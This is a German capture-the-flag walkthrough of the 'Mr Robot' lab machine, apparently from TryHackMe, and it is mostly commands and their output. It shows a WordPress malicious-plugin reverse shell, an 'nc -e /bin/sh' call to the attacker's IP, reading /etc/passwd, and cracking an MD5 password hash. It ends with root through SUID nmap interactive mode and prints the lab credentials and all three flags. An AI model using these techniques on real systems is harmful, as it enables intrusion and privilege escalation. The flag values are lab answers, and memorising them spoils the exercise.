# Mr Robot CTF
## nmap
```
[root@thm ~]$ nmap 10.10.146.189
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-01 00:50 CET
Nmap scan report for 10.10.146.189
Host is up (0.033s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https

Nmap done: 1 IP address (1 host up) scanned in 5.02 seconds
[root@thm ~]$ 
```

## http
http und https scheint den gleichen Content zu liefern. Durch die Oberflaeche kann etwas navigiert werden, allerdings wird hier nicht wirklich was brauchbares gefunden.

### robots.txt
robots.txt geprueft -> Datei _key-1-of-3.txt_ vermerkt, in dieser befindet sich der erste Key: 073403c8a58a1f80d943455fb30724b9 

### gobuster
- _http://10.10.146.189/0_ -> Wordpress Instanz
- _http://10.10.146.189/license_ -> Base64 encoded Credentials gefunden: elliot:ER28-0652 (mit diesen Daten kann sich bei Wordpress angemeldet werden)

## Wordpress
Version 4.3.1

Bei dem gefundenen Nutzer handelt es sich um den Admin. Hierdurch kann nun beispielsweise ein schadhaftes Plugin installiert werden um eine Reverse Shell zu erzeugen (siehe auch https://www.hackingarticles.in/wordpress-reverse-shell/).

`nc -lnvp 8080` vor dem aktivieren des Plugins starten.

## Reverse Shell
Der Nutzer hat scheinbar genug Rechte um aus dem Verzeichnis auszubrechen. Auf dem System findet man den Nutzer 'robot':
```
daemon@linux:/home/robot$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false
mysql:x:1001:1001::/home/mysql:
varnish:x:999:999::/home/varnish:
robot:x:1002:1002::/home/robot:
daemon@linux:/home/robot$ ls -al /home
ls -al /home
total 12
drwxr-xr-x  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
drwxr-xr-x  2 root root 4096 Nov 13  2015 robot
daemon@linux:/home/robot$ ls -al 
ls -al 
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
daemon@linux:/home/robot$ ls -al /etc/shadow
```

In dessen Homeverzeichnis liegt scheinbar der zweite Key. Ebenso wie ein MD5 Hash. Vermutlich handelt es sich hierbei um das Kennwort des Nutzers 'robot'.

Verwendet man ein Tool wie https://crackstation.net/ kann man den Hash schnell cracken: abcdefghijklmnopqrstuvwxyz

Um sich anmelden zu koennen muss allerdings erst eine TTY erzeugt werden, da ueber die Reverse Shell 'su' nicht aufgerufen werden kann (siehe https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/). Mit dem Python oneliner war dies erfolgreich:
```
daemon@linux:/home/robot$ su - robot
su - robot
su: must be run from a terminal
daemon@linux:/home/robot$ nc -e /bin/sh 10.9.45.203 4444
nc -e /bin/sh 10.9.45.203 4444
nc: invalid option -- 'e'
This is nc from the netcat-openbsd package. An alternative nc is available
in the netcat-traditional package.
usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
          [-P proxy_username] [-p source_port] [-q seconds] [-s source]
          [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
          [-x proxy_address[:port]] [destination] [port]
daemon@linux:/home/robot$ python --version
python --version
Python 2.7.6
daemon@linux:/home/robot$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/home/robot$ id
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
robot@linux:~$ 
```

Der zweite Key kann nun ausgelesen werden:
```
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
robot@linux:~$ 
```

## Priveledge escalation
Um eine Priveledge escalation durchzufuehren koennen standardmaessige Schritte durchgefuehrt werden. Bspw. LinPEAS oder folgendes Snippet:
```
find / -perm +6000 2>/dev/null | grep '/bin/'
```
Sucht nach Binaries, bei welchen das SUID Bit gesetzt ist. Hierbei kann 'nmap' gefunden werden, was ungewoehnlich ist:

```
robot@linux:~$ find / -perm +6000 2>/dev/null | grep '/bin/'
find / -perm +6000 2>/dev/null | grep '/bin/'
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/mail-touchlock
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/screen
/usr/bin/mail-unlock
/usr/bin/mail-lock
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/chfn
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/expiry
/usr/bin/dotlockfile
/usr/bin/sudo
/usr/bin/ssh-agent
/usr/bin/wall
/usr/local/bin/nmap
robot@linux:~$ ls -al /usr/local/bin/nmap
ls -al /usr/local/bin/nmap
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
robot@linux:~$ 
```

Unter https://gtfobins.github.io/ kann eine moegliche verwenden nachgelesen werden um die Rechte zu eskalieren:
```
robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> id
id
Unknown command (id) -- press h <enter> for help
nmap> !bash
!bash
bash-4.3$ id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
bash-4.3$ exit
exit
exit
waiting to reap child : No child processes
nmap> !sh
!sh
# id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
# 
```

Mit den Root Rechten kann nun die dritte und damit letzte Flag gefunden und ausgelesen werden
```
# ls -al /root
ls -al /root
total 32
drwx------  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
-rw-------  1 root root 4058 Nov 14  2015 .bash_history
-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
drwx------  2 root root 4096 Nov 13  2015 .cache
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd
# cat /root/key-3-of-3.txt
cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
# 
```
